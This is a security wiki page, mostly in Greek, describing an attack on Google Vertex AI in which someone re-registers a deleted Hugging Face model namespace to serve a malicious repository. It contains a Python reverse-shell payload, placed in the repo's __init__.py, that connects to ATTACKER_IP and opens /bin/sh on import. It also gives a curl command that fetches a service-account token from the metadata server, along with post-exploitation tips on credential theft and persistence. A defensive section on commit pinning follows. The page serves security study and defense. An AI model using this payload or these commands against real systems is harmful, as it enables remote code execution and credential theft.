# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenario

- Το Vertex AI Model Garden επιτρέπει την άμεση ανάπτυξη πολλών μοντέλων Hugging Face (HF).
- HF model identifiers are Author/ModelName. Εάν ένας author/org στο HF διαγραφεί, το ίδιο όνομα author μπορεί να επανεγγραφεί από οποιονδήποτε. Οι attackers μπορούν τότε να δημιουργήσουν ένα repo με το ίδιο ModelName στη legacy path.
- Pipelines, SDKs, ή cloud catalogs που κάνουν fetch μόνο με όνομα (χωρίς pinning/integrity) θα κατεβάσουν το attacker-controlled repo. Όταν το model αναπτυχθεί, ο loader code από εκείνο το repo μπορεί να εκτελεστεί μέσα στο Vertex AI endpoint container, παρέχοντας RCE με τα permissions του endpoint.

Two common takeover cases on HF:
- Ownership deletion: Η παλιά διαδρομή επιστρέφει 404 μέχρι κάποιος να επανεγγράψει τον author και να δημοσιεύσει το ίδιο ModelName.
- Ownership transfer: Το HF εκδίδει 307 redirects από το παλιό Author/ModelName προς τον νέο author. Αν ο παλιός author διαγραφεί αργότερα και επανεγγραφεί από attacker, η αλυσίδα redirect σπάει και το attacker’s repo σερβίρει στη legacy path.

## Identifying Reusable Namespaces (HF)

- Old author deleted: η σελίδα του author επιστρέφει 404; το model path μπορεί να επιστρέφει 404 μέχρι takeover.
- Transferred models: το παλιό model path εκδίδει 307 προς τον νέο owner όσο ο παλιός author υπάρχει. Αν ο παλιός author διαγραφεί αργότερα και επανεγγραφεί, η legacy path θα δείχνει στο attacker’s repo.

Quick checks with curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Ολοκληρωμένη ροή επίθεσης εναντίον Vertex AI

1) Ανακαλύψτε επαναχρησιμοποιήσιμα namespaces μοντέλων που το Model Garden εμφανίζει ως αναπτύξιμα:
- Βρείτε HF models στο Vertex AI Model Garden που εξακολουθούν να εμφανίζονται ως “verified deployable”.
- Επαληθεύστε στο HF αν ο αρχικός author έχει διαγραφεί ή αν το μοντέλο μεταφέρθηκε και ο παλιός author αφαιρέθηκε αργότερα.

2) Επανεγγράψτε τον διαγραμμένο author στο HF και αναδημιουργήστε το ίδιο ModelName.

3) Publish ένα malicious repo. Περιλάβετε code που εκτελείται κατά το model load. Παραδείγματα που συχνά εκτελούνται κατά το HF model load:
- Παράπλευρες ενέργειες στο __init__.py του repo
- Προσαρμοσμένα modeling_*.py ή processing code που αναφέρονται από config/auto_map
- Code paths που απαιτούν trust_remote_code=True σε Transformers pipelines

4) Μια Vertex AI deployment του legacy Author/ModelName πλέον τραβάει το κακόβουλο repo. Ο loader εκτελείται μέσα στο container του Vertex AI endpoint.

5) Το payload εγκαθιστά πρόσβαση από το περιβάλλον του endpoint (RCE) με τα δικαιώματα του endpoint.

Παράδειγμα αποσπάσματος payload που εκτελείται κατά το import (μόνο για επίδειξη):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Σημειώσεις
- Οι πραγματικοί loaders ποικίλλουν. Πολλές Vertex AI HF integrations κλωνοποιούν και εισάγουν repo modules που αναφέρονται στο config του μοντέλου (π.χ., auto_map), κάτι που μπορεί να προκαλέσει code execution. Ορισμένες χρήσεις απαιτούν trust_remote_code=True.
- Το endpoint συνήθως τρέχει σε αφιερωμένο container με περιορισμένο εύρος, αλλά αποτελεί έγκυρο αρχικό foothold για πρόσβαση σε δεδομένα και lateral movement στο GCP.

## Post-Exploitation Tips (Vertex AI Endpoint)

Μόλις code τρέχει μέσα στο endpoint container, σκεφτείτε:
- Απαρίθμηση μεταβλητών περιβάλλοντος και metadata για credentials/tokens
- Πρόσβαση σε συνδεδεμένη αποθήκευση ή σε προσαρτημένα artifacts μοντέλου
- Αλληλεπίδραση με Google APIs μέσω ταυτότητας service account (Document AI, Storage, Pub/Sub, κ.λπ.)
- Επίμονη παρουσία στο artifact του μοντέλου αν η πλατφόρμα επανα-τραβήξει το repo

Απαριθμήστε τα instance metadata αν είναι προσβάσιμα (εξαρτάται από το container):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Οδηγίες άμυνας για χρήστες του Vertex AI

- Κλειδώστε τα μοντέλα ανά commit στους HF loaders για να αποτρέψετε την αθόρυβη αντικατάσταση:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Καθρεφτίστε επαληθευμένα HF models σε ένα αξιόπιστο εσωτερικό artifact store/registry και κάντε deploy από εκεί.
- Σκανάρετε συνεχώς codebases και configs για hard-coded Author/ModelName που έχουν διαγραφεί/μεταβιβαστεί· ενημερώστε σε νέα namespaces ή pin ανά commit.
- Στο Model Garden, επαληθεύστε την προέλευση (provenance) του μοντέλου και την ύπαρξη του author πριν το deploy.

## Ευριστικές Αναγνώρισης (HTTP)

- Deleted author: η σελίδα του author 404; το legacy model path 404 μέχρι takeover.
- Transferred model: legacy path 307 προς νέο author ενώ ο παλιός author υπάρχει; αν ο παλιός author αργότερα διαγραφεί και επανεγγραφεί, το legacy path σερβίρει attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Διασταυρούμενες Αναφορές

- Δείτε την ευρύτερη μεθοδολογία και σημειώσεις για την αλυσίδα εφοδιασμού:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Αναφορές

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
